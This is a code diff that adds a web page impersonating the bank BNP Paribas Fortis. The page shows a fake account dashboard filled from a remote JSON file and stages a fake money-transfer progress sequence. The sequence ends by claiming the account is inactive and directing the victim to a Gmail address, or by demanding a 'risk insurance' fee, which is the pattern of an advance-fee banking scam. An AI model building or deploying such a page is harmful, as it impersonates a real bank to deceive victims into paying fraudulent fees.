@@ -1,9 +1,742 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-	<title>bootstrap</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>BNP Paribas Fortis</title>
 </head>
+
+<style>
+title{
+  color: white;
+  background: white;
+}
+  body{
+    position: absolute;
+    top: 0%;
+    left: 0%;
+    bottom: 0px;
+    right: 0px;
+    z-index: 1;
+   margin: 0px;
+    background:url("/bank/bankImg/1720033614890.jpg");
+    background-size: 100%;
+  }
+  .transfert input,.transferto input{
+    margin-bottom: 20px;
+    height:30px;
+    border: 0.5px solid seagreen;
+    outline: none;
+    width:300px;
+    border-radius: 4px;
+  }
+.transfert h2{
+  margin: 20px 0px;
+  padding: 8px 0px;
+ border-radius: 2px;
+  text-align: center;
+  width:300px;
+  color:seagreen;
+  background: white;
+  
+ 
+}
+.transfert{
+  margin: 10px 0px 0px 0px;
+  padding:0px 0px;
+  
+  background: whitesmoke;
+  
+  
+}
+.transferto h2,.transferto h4{
+  color: seagreen;
+  margin: 0px;
+}
+.transferto{
+  margin: 20px 0px 0px 0px;
+  padding:20px 0px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  background: whitesmoke;
+}
+  .account{
+    margin: 0px 0px 0px 0px;
+  padding: 0px 0px 20px 0px;
+    
+  background: whitesmoke;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .account h4,.account h3{
+    color: seagreen;
+  }
+  .account-dash{
+     font-size:20px;
+    display: flex;
+    padding: 20px 0px;
+  
+  }
+  .account span{
+   display: inline;
+    height: 5px;
+    width:15px;
+    border: 0.5px solid seagreen;
+    background:seagreen;
+    margin: 10px;
+   text-shadow: 12px 2px;
+  }
+  .account-typ{
+    font-weight: bolder;
+    font-size: 18px;
+  }
+  .bnp h2{
+   
+    margin: 0px 0px 0px 0px;
+    padding: 15px 0px;
+    color: lightseagreen;
+   text-align: center;
+   box-shadow: inset 0px 0px 22px 1px lightgrey;
+border: 2px solid whitesmoke;
+    background: white;
+    
+  }
+  .tot-amount h3{
+    border-radius: 2px;
+    color: white;
+    background:seagreen;
+   margin:0px;
+   padding:4px;
+    border-bottom:0.5px solid black;
+    text-align:center;
+  }
+  .tot-amount{
+    
+    height: 150px;
+    background: whitesmoke;
+   margin: 10px 0px;
+    
+   border-radius: 8px;
+  }
+  .money{
+    border-radius: 2px;
+   
+    width:300px;
+   padding: 18px 0px;
+  background:white;
+   font-size: 20px;
+    text-align: center;
+    }
+ .btn-send button{
+   margin: 0 auto;
+   text-align: center;
+   outline: none:
+   font-size:20px;
+   border:0.5px solid seagreen;
+   width:360px;
+   padding:8px;
+   background:seagreen;
+   color:white;
+   font-size:18px;
+ } 
+
+.hist{
+  
+  background: whitesmoke;
+  text-align: center;
+  
+} 
+.hist h2{
+  background: seagreen;
+  
+
+}
+.svg img{
+  height: 80px;.
+  width: 80px;
+ margin:20px auto;
+  border:none;
+border-radius: 50%;
+}
+
+footer {
+ text-align: center;
+  background: whitesmoke;
+
+  letter-spacing: 3px;
+padding: 20px 0px;
+
+
+}
+.overlay{
+  position:fixed;
+  top: -20%;
+  bottom: 0%;left: 0%;right: 0%;
+  background: whitesmoke;
+  display:none;
+ opacity: 0.5;
+ transition:1s opacity;
+ overflow:hidden;
+}
+.overlay-delay{
+  position:fixed;
+  top: 0%;
+  bottom: 0%;left: 0%;right: 0%;
+  background:black;
+  display:block;
+ opacity: 0.98;
+ overflow:hidden;
+ transition-property: opacity,position,background;
+ transition-duration: 1s, 500ms;
+ transition-timing-function:ease-out;
+ transition-delay: 0s, 2s;
+}
+
+.message{
+ position: absolute;
+ top: 20%;
+ height:400px;
+ width:100%;
+ z-index:100;
+ opacity: 1;
+ overflow: hidden;
+  background: white;
+}
+.message h1,.message h2{
+  color: seagreen;
+  text-align:center;
+}
+.actived{
+  margin: 20px auto;
+  text-align: center;
+  color:seagreen;
+}
+.not-actived {
+ margin: 20px auto;
+  text-align: center;
+  color: red;
+}
+.actif{
+  color: seagreen;
+  background: white;
+  padding: 10px 0px;
+  text-align: center;
+}
+.text-rond{
+display: flex;
+flex-direction: column;
+justify-content: center;
+align-items: center;
+position: relative;
+ font-size: 28px;
+  height: 80px;
+  width:0px;
+  border: 1px solid seagreen;
+  border-radius:50%;
+  transform: scale(0.5);
+  
+}
+.text-status{
+  opacity: 1;
+ position: relative;
+ transform: translateX(0px);
+ text-align: center;
+ transition: opacity 5s ease;
+}
+.curr{
+  
+  font-size: 40px;
+  color: seagreen;
+}
+ 
+
+.info{
+  color: red;
+}
+progress{
+   position: absolute;
+    top: 100%;
+   
+   background :whitesmoke;
+    height:30px;
+    width:400px;
+    text-align: center;
+    
+    box-sizing:border-box;
+    border-radius:20px;
+  }
+  .progress-done{
+    font-family: sans-serif;
+    font-weight: bolder;
+    height: 100%;
+    background: linear-gradient(to left,rgba(8, 239, 136, 1),rgba(211, 211, 211, 1));
+    border-radius:20px;
+  display: grid;
+  place-items: center;
+  margin: 20px auto;
+    width: 400px;
+    box-shadow: 0 0 3px -5px rgba(0, 167, 89, 1) ,0 3px whitesmoke#A9A9A9;
+    width: 0;
+    transition: width,5s ease; 
+    transition-timing-function: 4s;
+  }
+.processing{
+  position: fixed;
+  top: 70%;
+  text-align: center;
+  margin: 20px 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+</style>
 <body>
-     <p>hello word</p>
+ 
+    
+  
+  <div class="overlay" id="over">
+   
+  
+  <div class="opacity">
+        <div class="message">
+          <h1>BNP Paribas Fortis</h1>
+         <h2>Send Your Money</h2>
+         <div class="rond">
+         
+           <div class="text-status">
+            Virement en cours de transaction 
+           </div>
+
+             
+       <div class="progress">
+ 
+         <div class="progress-done">
+ 
+         </div>
+       </div>
+  
+</div>
+             <div class="processing">
+               money transfert
+             </div>
+    </div>
+  </div>
+         </div>
+        </div>
+      </div>
+      
+  
+</div>
+
+<div class="bnp">
+  <h2>BNP Paribas Fortis
+
+<div class="svg">
+
+  <img src="/bank/bankImg/bnp-paribas (1).jpg" alt="">
+</h2>
+</div>
+</div>
+
+<div class="account">
+  <div class="account-dash">
+      <span></span> <span></span>  
+      Your dashboard 
+  <span></span> <span></span>
+  </div>
+<div id="bankuser" class="account">
+  
+</div>
+
+
+    </div>
+  
+  <div class="transferto" >
+    <div class="trnf-title">
+
+      <h2>Transfert</h2>
+
+    </div>
+    <div class="inp-iban">
+      <div class="iban">
+        IBAN
+      </div>
+      <input type="text" value="" placeholder="IBAN">
+      <div class="info">
+
+      </div>
+      <div class="iban">
+        BIC
+      </div>
+      <input type="text" value="" placeholder="BIC">
+      <div class="info">
+
+      </div>
+      <div class="bic">
+        Montant
+      </div>
+      <input type="number" value="" placeholder="Montant">
+      <div class="info">
+
+      </div>
+    </div>
+  </div>
+
+  </div>
+ 
+  <div class="btn-send" id="trans">
+    
+  </div>
+  
+  </div>
+
+    
+    </div>
+
+        </div>
+      </div>
+    </div>
+
+   <script type="text/javascript">
+   const over=document.getElementById("over")
+   const info=document.getElementsByClassName('info')
+   const textStatus=document.getElementsByClassName("text-status")
+const inputTag=document.getElementsByTagName('input')
+const email=localStorage.getItem("email");
+const bankuser=document.getElementById("bankuser");
+const storeUser=localStorage.getItem('users')
+const trans=document.getElementById("trans")
+
+ 
+console.log(trans)
+
+const loadingDiv = document.getElementsByClassName("RainbowBackground");
+let ibanCheck,bicCheck,montantCheck=false
+var users=2
+
+ 
+fetch('https://raw.githubusercontent.com/lisbonne456/gitau/master/data.json').then(function(resp) {
+    return resp.json()
+  }).then(function(data) {
+  
+  userHtml(data) 
+  
+  })
+function transfert(user){
+  
+  return `
+ <button id="${user.email}" type="submit" onclick=overlay("${user.email}","${user.tot_amount}","${user.tot_deposit}","${user.status}","${user.currency}","${user.cardBank.iban}","${user.cardBank.bic}","${user.assurance}")> Transfert</button>
+  `
+}
+
+function overlay(email,amount,deposit,status,currency,iban,bic, assurance){
+  if(ibanCheck && bicCheck&& montantCheck) {
+  over.className='overlay-delay'
+  if (email != '') {
+  
+  
+  const timeout = setTimeout(loaded(50, `
+  <div class="actived">
+    
+
+  Verification d'Identités  personnelles confirmées ✓
+    </div>`), 0)
+  clearTimeout(timeout)
+  
+  if (Number(amount) +Number(deposit)>= Number(inputTag[2].value)) {
+ 
+    const timeout = setTimeout(loaded(70, `
+    <div class="actived">
+      
+   
+              <h4>IBAN</h4>
+            Virement instantané de ${inputTag[2].value} ${currency}
+          
+            <div class="iban-transf">
+            
+     ${iban} --------->FR26493HGLlo
+            </div>
+                       </div>
+            `), 1000)
+    clearTimeout(timeout)
+    
+    
+ 
+    if (status==320) {
+ const timeout = setTimeout(loaded(90,
+ `
+ <div class="not-actived">
+   
+
+ Votre compte bancaire n'est pas encore activé car votre solde montant est de 0€. <div>
+   IBAN:${iban}
+ </div>
+ <div>
+   BIC:${bic}
+ </div>
+ Veillez conctater le service financier de la banque BNP Paribas Fortis à l'adresse mail suivante pour une activation réussie 
+ reunierprospere@gmail.com
+</div> `), 3000)
+ clearTimeout(timeout)
+
+    
+    }
+    else {
+      if (Number(assurance)==0) {
+        
+        const timeout = setTimeout(loaded(99, `
+        <div class="not-actived">
+         <h3>votre assurance risque est vide (0€).
+        </h3> 
+        Une Assurance financière est demandée par la banque BNP Paribas Fortis pour  couvrir le risque d'un non remboursement d'un prêt ou en cas d'utilisation de l'argent de donation à des fins malveillants (drogue, activités criminelles)
+       <h3>
+         ç'est presque fini
+       </h3> 
+        </div>
+                      `), 1000)
+        clearTimeout(timeout)
+        
+        
+        
+    
+        
+      }
+      const timeout = setTimeout(loaded(100, `
+        <div class="actived">
+         
+       transaction réussie
+   
+        </div>
+                      `), 1000)
+        clearTimeout(timeout)
+        
+      
+    }
+  }
+  }
+  }
+  else{
+    if(inputTag[0].value==""){
+      info[0].innerHTML="Iban is not empty"
+      
+    }
+    if(inputTag[1].value==""){
+      info[1].innerHTML="BIC is not empty"
+    }
+    if(inputTag[2].value==''){
+      info[2].innerHTML='Montant is not empty'
+   
+    }
+    
+  }
+  if(inputTag[0].value!=""){
+      ibanCheck=true;
+      info[0].textContent=''
+  }
+  if(inputTag[1].value!=""){
+      bicCheck=true
+      info[1].textContent=''
+  }
+    if (inputTag[2].value!= '') {
+    
+        if (Number(inputTag[2].value)> Number(Number(amount)+Number(deposit))) {
+        
+          info[2].innerHTML = 'votre solde est insuffisant'
+    
+        }
+       
+      else{
+        console.log(Number(inputTag[2].value),Number(amount+deposit))
+        montantCheck=true
+        
+        info[2].textContent= ''
+      }
+    
+    }
+    
+    
+}
+
+function statusCheck(status){
+  if (status===420) return 'Yes'
+  else return 'Not'
+}
+function statusClass(statusClass){
+  
+  if (statusClass===420) return "actived"
+  else return 'not-actived'
+}
+function userHtml(user){
+const filtIndex=user.findIndex(function(userSelect){
+  return  userSelect.email==email
+})
+const filtuser=user[filtIndex]
+let returnHtml=`
+<div class="tot-amount">
+  <h3> Total Amount</h3>
+  <div class="money">
+    ${filtuser.tot_amount}
+        <div class="curr">
+          ${filtuser.currency}
+        </div>
+  </div>
+</div>
+<div class="tot-amount">
+  <h3> Total Deposit</h3>
+  <div class="money">
+    ${filtuser.tot_deposit}
+        <div class="curr">
+          ${filtuser.currency}
+        </div>
+  </div>
+</div>
+<div class="tot-amount">
+  <h3>Total Balance</h3>
+  <div class="money">
+    ${filtuser.tot_amount+filtuser.tot_deposit}
+    <div class="curr">
+         ${filtuser.currency}
+    </div>
+ 
+  </div>
+</div>
+
+</div>
+<div class="transfert" id="trf-user">
+  <div class="account-dtl">
+    <h2>Account details </h2>
+  </div>
+  <div class="account-typ">
+    <h3> Service Financier</h3>
+    <div>
+     ${filtuser.typeofCompte}
+    </div>
+    <div class="account-duree">
+      <h3>Email</h3>
+      <div>
+       ${filtuser.email} 
+      </div>
+      <div class="account-typ">
+        <h3>Name</h3>
+        <div>
+         ${filtuser.name}
+        </div>
+        <div class="account-typ">
+          <h3>FirstName</h3>
+          <div>
+            ${filtuser.prenom}
+          </div>
+           <div class="account-typ">
+             <h3>Pays</h3>
+             <div>
+               ${filtuser.pays}
+             </div>
+          <div class="account-typ">
+            <h3>Frais d'assurance</h3>
+            <div>${filtuser.assurance}
+               
+                   ${filtuser.currency}
+                 
+            </div>
+            </div>
+            
+                <div class="account-typ">
+                 <h4>Contrat</h4>
+                  ${filtuser.contrat}
+                </div>
+            
+                <div class="account-typ">
+                 <h4>BankName</h4>
+                  ${filtuser.cardBank.bankName}
+                </div>
+            <div class="account-typ">
+              <h3>Cart bancaire</h3>
+              <div>
+                <h4> IBAN</h4>
+              </di.class=""v>
+              <div class="account-typ">
+                ${filtuser.cardBank.iban}
+              </div>
+              <div clclass="account-typ">
+                <h4>BIC</h4>
+               ${filtuser.cardBank.bic}
+              </div>
+              <div class="account-typ">
+              <h4>Status Bank Account</h4>
+              <div class="actif">
+                Activé 
+              </div>
+              <div class="${statusClass(filtuser.status)}">
+               ${
+               
+               statusCheck(filtuser.status)
+               } 
+              </div>
+             
+              </div>
+            </div>
+`
+window.addEventListener('load',displayContextUser(returnHtml,filtuser))
+}
+
+  function displayContextUser(content,user){
+  
+  bankuser.innerHTML=content
+  trans.innerHTML=transfert(user)
+}
+
+
+
+
+
+
+
+
+function loaded(endLoad,text) {
+  let counter=0
+ if(counter===0){
+   
+    let elem=document.getElementsByClassName("progress-done")
+    console.log(elem)
+    var width=10
+    var main=setInterval(frame,100)
+    function frame() {
+     
+      if(width==endLoad){
+        
+ textStatus[0].innerHTML=text
+ 
+ 
+        clearInterval(main)
+      }
+      else{
+        
+        width++
+
+  elem[0].style.width=width+"%"
+         elem[0].innerHTML=width+"%"
+      
+         
+         
+        
+        
+        
+      }
+    }
+  }
+}
+
+
+</script>
+
+
 </body>
+    <footer>
+    All right reserved ©2024
+   
+    
+    </footer>
 </html>
